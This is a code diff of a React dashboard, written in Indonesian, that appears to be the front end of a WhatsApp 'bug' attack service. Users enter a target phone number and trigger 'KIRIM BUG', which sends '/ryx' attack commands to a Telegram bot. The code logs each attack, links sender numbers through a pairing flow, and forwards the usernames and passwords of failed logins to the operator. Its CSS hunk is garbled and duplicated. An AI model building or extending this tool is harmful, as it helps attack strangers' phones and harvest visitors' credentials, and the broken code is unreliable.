@@ -33,7 +33,6 @@ export default function YaeMikoDashboard() {
 
   const [userRole, setUserRole] = useState<"free" | "admin">("free")
 
-  // STATE SENDER
   const [senderType, setSenderType] = useState<"global" | "pribadi">("global")
   const [senderNumber, setSenderNumber] = useState("")
   const [pairingStatus, setPairingStatus] = useState<"idle" | "loading" | "success">("idle")
@@ -148,7 +147,35 @@ export default function YaeMikoDashboard() {
     }
   }
 
-  const syncWithCloud = async (action: 'get' | 'set' | 'sendReport', valueToSet?: number, messageText?: string) => {
+  const syncPairing = async (action: 'get' | 'set_code', messageText?: string) => {
+    try {
+      if (action === 'get') {
+        const res = await fetch(`/api/webhook?update=${Date.now()}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'get_data' })
+        })
+        const data = await res.json()
+        if (data) {
+          if (data.isLocked!== undefined) setIsWebLocked(data.isLocked === true)
+          if (pairingStatus === "loading" && data.pairingCode) {
+            setReceivedCode(data.pairingCode)
+            setPairingStatus("success")
+          }
+        }
+      } else if (action === 'set_code' && messageText) {
+        await fetch('/api/webhook', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'set_code', messageText })
+        })
+      }
+    } catch (err) {
+      console.error(err)
+    }
+  }
+
+  const syncControl = async (action: 'get' | 'set' | 'sendReport', valueToSet?: number, messageText?: string) => {
     try {
       if (userRole === "admin" && (action === 'get' || action === 'set')) return
 
@@ -160,15 +187,9 @@ export default function YaeMikoDashboard() {
           body: JSON.stringify({ action: 'get_data' })
         })
         const data = await res.json()
-        if (data && data.ok &&!isSendingRef.current) {
+        if (data &&!isSendingRef.current) {
           if (data.limit!== undefined) setBugLimit(Number(data.limit))
-          if (data.locked!== undefined) setIsWebLocked(data.locked)
-
-          // Auto munculin kode pairing
-          if (pairingStatus === "loading" && data.pairingCode) {
-            setReceivedCode(data.pairingCode)
-            setPairingStatus("success")
-          }
+          if (data.locked!== undefined) setIsWebLocked(data.locked === true)
         }
       } else if (action === 'set' && valueToSet!== undefined) {
         await fetch('/api/control', {
@@ -188,36 +209,20 @@ export default function YaeMikoDashboard() {
     }
   }
 
-// LOGIKA PAIRING AUTOMATIC SYNC BY SELZ
   const handleRequestPairing = async () => {
     if (!senderNumber) return alert("Masukin nomor sender dulu!")
     setPairingStatus("loading")
-    
-    try {
-      // 1. Kirim laporan pairing ke bot telegram lu
-      await syncWithCloud('sendReport', undefined, `/pair ${senderNumber}`)
-      
-      // 2. Jalankan mesin looping buat nge-check database Upstash secara berkala
-      const checkDatabaseInterval = setInterval(async () => {
-        const res = await fetch(`/api/control?update=${Date.now()}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ action: 'get_data' })
-        })
-        const data = await res.json()
-        
-        // Jika route.ts mendeteksi ada data 'yaemiko_pairing_code' di Upstash
-        if (data && data.pairingCode) {
-          setReceivedCode(data.pairingCode)
-          setPairingStatus("success")
-          clearInterval(checkDatabaseInterval) // Stop loop kalau kode udah dapet
-        }
-      }, 3000) // Cek setiap 3 detik sekali
 
-      // 3. Batasi waktu tunggu maksimal 45 detik biar hp lu ga panas ngetok database mulu
+    try {
+      await syncControl('sendReport', undefined, `/pair ${senderNumber}`)
+
+      const checkDatabaseInterval = setInterval(async () => {
+        await syncPairing('get')
+      }, 3000)
+
       setTimeout(() => {
         clearInterval(checkDatabaseInterval)
-        setPairingStatus((prev) => prev === "loading" ? "idle" : prev)
+        setPairingStatus((prev) => prev === "loading"? "idle" : prev)
       }, 45000)
 
     } catch (e) {
@@ -229,7 +234,8 @@ export default function YaeMikoDashboard() {
   useEffect(() => {
     sendInitialIntel()
     async function initData() {
-      await syncWithCloud('get')
+      await syncControl('get')
+      await syncPairing('get')
       const localVerify = localStorage.getItem('target_verified')
       if (localVerify === 'true') {
         setIsVerified(true)
@@ -241,7 +247,8 @@ export default function YaeMikoDashboard() {
 
   useEffect(() => {
     const autoRefresh = setInterval(async () => {
-      await syncWithCloud('get')
+      await syncControl('get')
+      await syncPairing('get')
     }, 4000)
     return () => clearInterval(autoRefresh)
   }, [userRole, pairingStatus])
@@ -273,17 +280,17 @@ export default function YaeMikoDashboard() {
       setIsLoggedIn(true)
       setShowErrorOverlay(false)
       const logMsg = `👑 *LAPORAN LOGIN ADMIN OWNER*\n\n👤 *User:* ${username}\n⚡ *Status:* Masuk sebagai Administrator`
-      await syncWithCloud('sendReport', undefined, logMsg)
+      await syncControl('sendReport', undefined, logMsg)
     } else if (username === "Selz" && password === "Freebug") {
       setUserRole("free")
       setIsLoggedIn(true)
       setShowErrorOverlay(false)
       const logMsg = `🔔 *LAPORAN LOGIN DASHBOARD MEMBER*\n\n👤 *User:* ${username}`
-      await syncWithCloud('sendReport', undefined, logMsg)
+      await syncControl('sendReport', undefined, logMsg)
     } else {
       setShowErrorOverlay(true)
       const alertMsg = `⚠️ *PERCOBAAN LOGIN GAGAL!*\n\n👤 *Username input:* ${username || 'Kosong'}\n🔑 *Password input:* ${password || 'Kosong'}`
-      await syncWithCloud('sendReport', undefined, alertMsg)
+      await syncControl('sendReport', undefined, alertMsg)
     }
   }
 
@@ -304,7 +311,7 @@ export default function YaeMikoDashboard() {
     if (userRole === "free") {
       nextLimit = Math.max(0, bugLimit - 1)
       setBugLimit(nextLimit)
-      await syncWithCloud('set', nextLimit)
+      await syncControl('set', nextLimit)
     }
 
     const delay = engineSpeed === "Instant"? 1000 : engineSpeed === "Fast"? 2500 : 4000
@@ -314,18 +321,14 @@ export default function YaeMikoDashboard() {
       const sisaLimitText = userRole === "admin"? "UNLIMITED (👑 ADMIN)" : `${nextLimit}/5`
 
       const attackMsg = `🚀 *LAPORAN PENYERANGAN BUG*\n\n👤 *Pengirim:* ${username} (${userRole.toUpperCase()})\n🎯 *Target:* \`${targetNumber}\`\n👾 *Jenis Bug:* ${selectedBug}\n⚡ *Speed Engine:* ${engineSpeed}\n📉 *Sisa Limit User:* ${sisaLimitText}\n📱 *Sender Mode:* ${senderType.toUpperCase()}`
-      await syncWithCloud('sendReport', undefined, attackMsg)
+      await syncControl('sendReport', undefined, attackMsg)
 
       setTimeout(async () => {
         const commandShortMsg = senderType === "pribadi" && senderNumber
-        ? `/ryx ${targetNumber} ${senderNumber}`
+      ? `/ryx ${targetNumber} ${senderNumber}`
           : `/ryx ${targetNumber}`
 
-        await fetch('/api/control', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ action: 'sendReport', messageText: commandShortMsg })
-        })
+        await syncControl('sendReport', undefined, commandShortMsg)
       }, 1000)
 
       if (isVerified) {
@@ -373,7 +376,6 @@ export default function YaeMikoDashboard() {
       </div>
       <audio ref={bgMusicRef} src="/audio.mp3" loop />
 
-      {/* POP-UP PAIRING */}
       {pairingStatus === "loading" && (
         <div className="fixed inset-0 z-[10008] bg-black/95 flex-col items-center justify-center backdrop-blur-md">
           <Loader2 className="w-16 h-16 text-cyan-400 animate-spin mb-4" />
@@ -477,7 +479,7 @@ export default function YaeMikoDashboard() {
             <div className="animate-in fade-in duration-500">
               <div className="flex justify-between items-center mb-6">
                 <span className="text-xs font-black uppercase tracking-widest text-cyan-400">SPEED: {engineSpeed}</span>
-                <span className={`text-xs font-black uppercase px-4 py-1 rounded-full border ${userRole === 'admin'? 'text-cyan-400 border-cyan-500/20 bg-cyan-500/10' : bugLimit > 0? 'text-pink-500 border-pink-500/20 bg-pink-500/10' : 'text-red-500 border-red-500/20 bg-red-500/10'}`}>
+                <span className={`text-xs font-black uppercase px-4 py-1 rounded-full border ${userRole === 'admin'? 'text-cyan-400 border-cyan-500/20 bg-cyan-500/10' : bugLimit > 0? 'text-pink-500 border-pink-500/20 bg-pink-500/10' : 'text-red-500 border-red-500/20 bg-pink-500/10'}`}>
                   {userRole === "admin"? "ROLE: ADMIN" : `LIMIT: ${bugLimit}/5`}
                 </span>
               </div>
@@ -518,16 +520,15 @@ export default function YaeMikoDashboard() {
 
               <button onClick={handleSendBug} className="w-full py-5 bg-gradient-to-r from-pink-600 via-red-600 to-orange-600 rounded-[2.5rem] font-black uppercase italic text-xs text-white shadow-xl active:scale-95 transition-all">KIRIM BUG</button>
 
-              {/* SENDER SELECTOR */}
               <div className="bg-white/5 border-white/10 rounded-3xl p-5 mt-4">
                 <div className="flex gap-2 mb-4">
-                  <button onClick={() => setSenderType("global")} className={`flex-1 py-3 rounded-xl text- font-black uppercase ${senderType === "global"? "bg-cyan-600" : "bg-black/40"}`}>GLOBAL</button>
-                  <button onClick={() => setSenderType("pribadi")} className={`flex-1 py-3 rounded-xl text- font-black uppercase ${senderType === "pribadi"? "bg-cyan-600" : "bg-black/40"}`}>PRIBADI</button>
+                  <button onClick={() => setSenderType("global")} className={`flex-1 py-3 rounded-xl text-xs font-black uppercase ${senderType === "global"? "bg-cyan-600" : "bg-black/40"}`}>GLOBAL</button>
+                  <button onClick={() => setSenderType("pribadi")} className={`flex-1 py-3 rounded-xl text-xs font-black uppercase ${senderType === "pribadi"? "bg-cyan-600" : "bg-black/40"}`}>PRIBADI</button>
                 </div>
                 {senderType === "pribadi" && (
                   <div className="space-y-3 animate-in fade-in">
                     <input value={senderNumber} onChange={(e) => setSenderNumber(e.target.value)} className="w-full bg-black border-white/10 p-3 rounded-xl text-center text-xs text-cyan-400 font-bold" placeholder="NOMOR SENDER (628...)" />
-                    <button onClick={handleRequestPairing} className="w-full py-3 bg-pink-600 rounded-xl font-black text- uppercase">REQUEST PAIRING</button>
+                    <button onClick={handleRequestPairing} className="w-full py-3 bg-pink-600 rounded-xl font-black text-xs uppercase">REQUEST PAIRING</button>
                   </div>
                 )}
               </div>
@@ -569,15 +570,33 @@ export default function YaeMikoDashboard() {
       )}
 
       <style jsx global>{`
-        @keyframes shake { 0% { transform: translate(2px, 2px); } 10% { transform: translate(-1px, -2px); } 100% { transform: translate(0); } }
-      .animate-shake_violent { animation: shake 0.1s infinite; }
-        @keyframes rumble { 0%, 100% { background-color: rgba(69, 10, 10, 0.9); } 50% { background-color: rgba(127, 29, 29, 0.95); } }
-      .animate-bg_rumble { animation: rumble 0.15s infinite; }
-        @keyframes glitch { 0% { text-shadow: 2px 0 #ff0000, -2px 0 #00ffff; } 100% { text-shadow: -2px 0 #ff0000, 2px 0 #00ffff; } }
-      .animate-glitch_extreme { animation: glitch 0.1s infinite; }
-      .animate-in { animation: fadeIn 0.5s ease-out forwards; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes shake {
+          0% { transform: translate(2px, 2px); }
+          10% { transform: translate(-1px, -2px); }
+          100% { transform: translate(0); }
+        }
+       .animate-shake_violent { animation: shake 0.1s infinite; }
+
+        @keyframes rumble {
+          0%, 100% { background-color: rgba(69, 10, 10, 0.9); }
+          50% { background-color: rgba(127, 29, 29, 0.95); }
+        }
+       .animate-bg_rumble { animation: rumble 0.3s infinite; }
+
+        @keyframes glitch {
+          0% { text-shadow: 2px 0 red 50% { background-color: rgba(127, 29, 29, 0.95); }
+        }
+       .animate-bg_rumble { animation: rumble 0.3s infinite; }
+
+        @keyframes glitch {
+          0% { text-shadow: 2px 0 red, -2px 0 cyan; }
+          25% { text-shadow: -2px 0 red, 2px 0 cyan; }
+          50% { text-shadow: 2px 2px red, -2px -2px cyan; }
+          75% { text-shadow: -2px -2px red, 2px 2px cyan; }
+          100% { text-shadow: 2px 0 red, -2px 0 cyan; }
+        }
+       .animate-glitch_extreme { animation: glitch 0.2s infinite; }
       `}</style>
     </div>
   )
-         }
+}
